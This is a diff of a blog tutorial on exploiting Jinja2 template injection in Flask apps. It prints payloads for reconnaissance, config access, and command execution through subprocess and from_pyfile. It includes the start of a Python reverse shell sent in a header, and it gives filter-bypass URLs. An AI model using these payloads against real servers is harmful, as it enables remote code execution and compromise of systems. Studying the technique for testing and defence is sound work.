@@ -14,7 +14,7 @@ While SSTI in Flask are nothing new, we recently stumbled upon several articles 
 As everything in this field, explore the docs of [Jinja](http://jinja.pocoo.org/docs/2.10/), [Flask](http://flask.pocoo.org/docs/1.0/api/) & Python and learn them by heart. Assuming this, I'm not going to explore in detail how does Flask/Jinja work, neither python internals.
 
 ### Reconnaissance
-You can try to probe `{{7*'7'}}` to see if the target is vulnerable. It would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. Note that there are other methods to identify more template engines. [Tplmap](https://github.com/epinna/tplmap/) or its [Burp Suite Plugin](https://github.com/epinna/tplmap/blob/master/burp_extension/README.md) will do the trick. This guide will specifically focus on Jinja2.
+You can try to probe {% raw %}`{{7*'7'}}`{% endraw %} to see if the target is vulnerable. It would result in `49` in Twig, `7777777` in Jinja2, and neither if no template language is in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. Note that there are other methods to identify more template engines. [Tplmap](https://github.com/epinna/tplmap/) or its [Burp Suite Plugin](https://github.com/epinna/tplmap/blob/master/burp_extension/README.md) will do the trick. This guide will specifically focus on Jinja2.
 
 ### Basics
 In python `__mro__` or `mro()` allows us to go back up the tree of inherited objects in the current Python environment, and `__subclasses__` lets us come back down. Read the [docs](https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#class.__mro__) for more.
@@ -37,7 +37,7 @@ The following global variables are available within Jinja2 templates by default:
 
 If you want to explore in major details their globals, here are the links to the API docs: [Flask](http://flask.pocoo.org/docs/1.0/templating/#standard-context) and [Jinja](http://jinja.pocoo.org/docs/dev/templates/#builtin-globals).
 
-#### Introspection
+### Introspection
 You may conduct introspection with the `locals` object using `dir` and `help` to see everything that is available to the template context. You can also use introspection to reach every other application variable.  This [script]({{site.bloburl}}/assets/search.py) written by the [DoubleSigma](https://ctftime.org/writeup/10851) team will traverse over child attributes of request recursively. 
 For example, if you need to reach the blacklisted `config` var you may access it anyway via:
 {% raw %}
@@ -73,14 +73,14 @@ This injection will do the trick:
 Mind that index numbers may vary (i.e. [4],[40]) according to the environment.
 
 ### Remote code execution
-##### First method
+#### First method
 By using the `subprocess` class you may issue arbitrary commands. This may be version-dependent:
 {% raw %}
 ```
 {{config.items()[4][1].__class__.__mro__[2].__subclasses__()[229]([\"touch /tmp/test\"], shell=True) }}
 ```
 {% endraw %}
-##### Second Method
+#### Second Method
 Luckily, the config object comes with a function `from_pyfile()` which reads, compiles and then executes a python file. We now write arbitrary payloads by passing `request.headers['X-Payload']` to the `write` function and sending the `X-Payload` header:
 {% raw %}
 ```
@@ -100,13 +100,13 @@ X-Payload: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ### Filters bypass
 Generally, if there is a blacklist you can use `request.args.param` to retrieve the value of a new param passed with the querystring. Likewise, you may trim parts of the URL using `request.url[n:]` (e.g.  `{{request[request.url[-6:]]}}&a=config` ).
 I'll report some examples below:
-##### Bypass the filtering on `__`:
+#### Bypass the filtering on `__`:
 {% raw %}
 ```
 http://localhost:5000/?exploit={{request[request.args.param]}}&param=__class__
 ```
 {% endraw %}
-#####  Bypass the filtering on `.` or `[]`:
+####  Bypass the filtering on `.` or `[]`:
 Using [Jinja2 filters](http://jinja.pocoo.org/docs/2.10/templates/#list-of-builtin-filters) like `|attr()`:
 {% raw %}
 ```
@@ -115,7 +115,7 @@ http://localhost:5000/?exploit={{request|attr(request.args.param)}}&param=__clas
 {% endraw %}
 Remember that you can always use the `__getitem__` to achieve the same, getting an item by key or index.
 
-##### Generic blacklist evasion
+#### Generic blacklist evasion
 - Using the `|join` filter will concatenate a list of strings. Also, multiplication of a string with a number 'n' duplicates it 'n' times. You may use both tricks to get bypass.
 - You can also use the `.getlist()` function to simplify the building of the injection. The function returns a list of all parameters with a given name. In our case we define the name using the l parameter and the content of the list with several a parameters.
 {% raw %}
